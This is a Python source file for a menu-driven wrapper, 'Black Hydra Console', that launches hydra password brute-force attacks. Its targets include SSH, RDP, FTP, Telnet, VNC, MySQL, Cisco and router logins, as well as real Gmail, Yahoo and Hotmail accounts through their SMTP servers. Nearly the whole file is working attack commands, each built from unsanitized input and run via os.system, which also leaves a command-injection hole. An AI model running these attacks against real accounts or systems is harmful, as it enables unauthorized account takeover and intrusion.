#-*-coding: utf-8-*-
import sys, os
from platform import python_version as pv
from platform import system as s
"""
This program is just a small program to shorten brute force sessions on hydra :)
But to be more satisfying results of the brute force. You better interact directly with hydra,
without having to use this black hydra console first: ').
If you find any errors in running our program. Can chat via facebook :).
Hydra is needed for the process of this program :).
"""



def attack(service, command):
    print("\n+------------------------------+")
    print(service)
    print("+------------------------------+")
    print("\n\n\n")
    os.system(command)
# Restart ####################

##############################
if __name__ == '__main__':
    if str(pv())[0] == "3":
        raw_input = input
    if s() == "Windows":
        clear = "cls"
    else:
        clear = "clear"
    bhydra = ""
    while bhydra != "0" and bhydra != "00" and bhydra != 0:
        os.system(clear)
        print("___  _    ____ ____ _  _    _  _ _   _ ___  ____ ____")
        print("|__] |    |__| |    |_/     |__|  \_/  |  \ |__/ |__|")
        print("|__] |___ |  | |___ | \_    |  |   |   |__/ |  \ |  |")
        print("-----------------------------------------------------")
        print("[]xxxxx[]::::::::::::::::::::> 24-07-2017 (7:53)")
        print(" [*] Author: DedSecTL  ---  [*] Version 1.0")
        print("c=={:::::::::::::::> Black Hydra Console")
        print("(}xxx{):::::::::> AndroSec1337 Cyber Team")
        print("              ===|[ Brute Force ]|===")
        print("  [01] Cisco Brute Force         ")
        print("  [02] VNC Brute Force           ")
        print("  [03] FTP Brute Force           ")
        print("  [04] Gmail Brute Force         ")
        print("  [05] SSH Brute Force           ")
        print("  [06] TeamSpeak Brute Force     ")
        print("  [07] Telnet Brute Force        ") 
        print("  [08] Yahoo Mail Brute Force    ")
        print("  [09] Hotmail Brute Force       ")
        print("  [10] Router Speedy Brute Force ")
        print("  [11] RDP Brute Force           ")
        print("  [12] MySQL Brute Force         ")
        print("  [00] Exit")
        bhydra = raw_input("[*] B-Hydra > ")
        if bhydra == '01' or bhydra == '1':
            service = "CISCO BRUTE FORCE"
            iphost = raw_input("[*] IP/Hostname : ")
            word = raw_input("[*] Wordlist : ")
            attack(service, "hydra -P %s %s cisco" % (word, iphost))
        elif bhydra == '02' or bhydra == '2':
            service = "VNC Brute Force"
            word = raw_input("[*] Wordlist : ")
            iphost = raw_input("[*] IP/Hostname : ")
            attack(service, "hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
        elif bhydra == '03' or bhydra == '3':
            service = "FTP Brute Force"
            user = raw_input("[*] User : ")
            iphost = raw_input("[*] IP/Hostname : ")
            word = raw_input("[*] Wordlist : ")
            attack(service, "hydra -l %s -P %s %s ftp" % (user, word, iphost))
        elif bhydra == '04' or bhydra == '4':
            service = "Gmail Brute Force"
            email = raw_input("[*] Email : ")
            word = raw_input("[*] Wordlist : ")
            attack(service,"hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
        elif bhydra == '05' or bhydra == '5':
            service = "SSH Brute Force"
            user = raw_input("[*] User : ")
            word = raw_input("[*] Wordlist : ")
            iphost = raw_input("[*] IP/Hostname : ")
            attack(service,"hydra -l %s -P %s %s ssh" % (user, word, iphost))
        elif bhydra == '06' or bhydra == '6':
            service = "TeamSpeak Brute Force"
            user = raw_input("[*] User : ")
            word = raw_input("[*] Wordlist : ")
            iphost = raw_input("[*] IP/Hostname : ")
            attack(service,"hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
        elif bhydra == '07' or bhydra == '7':
            service = "Telnet Brute Force"
            user = raw_input("[*] User : ")
            word = raw_input("[*] Wordlist : ")
            iphost = raw_input("[*] IP/Hostname : ")
            attack(service,"hydra -l %s -P %s %s telnet" % (user, word, iphost))
        elif bhydra == '08' or bhydra == '8':
            service = "Yahoo Brute Force"
            email = raw_input("[*] Email : ")
            word = raw_input("[*] Wordlist : ")
            attack(service,"hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
        elif bhydra == '09' or bhydra == '9':
            service = "Hotmail Brute Force"
            email = raw_input("[*] Email : ")
            word = raw_input("[*] Wordlist : ")
            attack(service,"hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
        elif bhydra == '10':
            service = "Router Speedy Brute Force"
            user = raw_input("[*] User : ")
            word = raw_input("[*] Wordlist : ")
            iphost = raw_input("[*] IP/Hostname : ")
            attack(service,"hydra -m / -l %s -P %s %s http-get" % (user, word, iphost)) 
        elif bhydra == '11':
            service = "RDP Brute Force "
            user = raw_input("[*] User : ")
            word = raw_input("[*] Wordlist : ")
            iphost = raw_input("[*] IP/Hostname : ")
            attack(service,"hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
        elif bhydra == '12':
            service = "MySQL Brute Force"
            user = raw_input("[*] User : ")
            word = raw_input("[*] Wordlist : ")
            attack(service,"hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
        elif bhydra == '00' or bhydra == '0':
            print("\n[!] Exit the Program...")
        else:
            continue
